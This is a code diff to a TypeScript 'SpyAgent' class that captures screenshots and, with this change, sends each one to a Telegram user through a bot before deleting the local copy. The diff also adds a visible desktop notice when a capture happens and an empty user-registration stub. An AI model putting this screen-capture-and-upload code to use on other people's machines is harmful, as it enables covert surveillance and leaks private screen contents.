@@ -6,7 +6,7 @@ import os from "os";
 import { exec } from "child_process";
 import path from "path";
 import { Context, Telegraf } from "telegraf";
-import { Action } from "./types";
+import { Action, UserData } from "./types";
 
 export default class SpyAgent {
     _cacheDir: string;
@@ -104,6 +104,15 @@ export default class SpyAgent {
         });
     }
 
+    registerUser(data: UserData) {
+        try {
+
+        }
+        catch (err) {
+            console.log(err);
+        }
+    }
+
     identify() {
         const platform: string = os.platform();
         switch (platform) {
@@ -140,6 +149,11 @@ export default class SpyAgent {
             screenshot({ format: 'png' })
                 .then(async (img) => {
                     const fileName = await this.imageSaver(img);
+                    this.notifier.notify({
+                        title: "Screenshot taken 😉",
+                        message: "agent007 is on duty 👮",
+                        icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                    });
                     this.enqueue(fileName);
                 })
                 .catch((err: any) => {
@@ -183,7 +197,7 @@ export default class SpyAgent {
                     const file = this.getFirstFile();
                     if (file === '') return;
                     const image = path.join(process.cwd(), process.env.FILE_DIR!, file);
-                    // await this._bot.telegram.sendPhoto(this.userName!, { source: image });
+                    await this._bot.telegram.sendPhoto(this.userName!, { source: image });
                     unlinkSync(path.join(process.cwd(), process.env.FILE_DIR!, file));
                     this.dequeue();
                 }
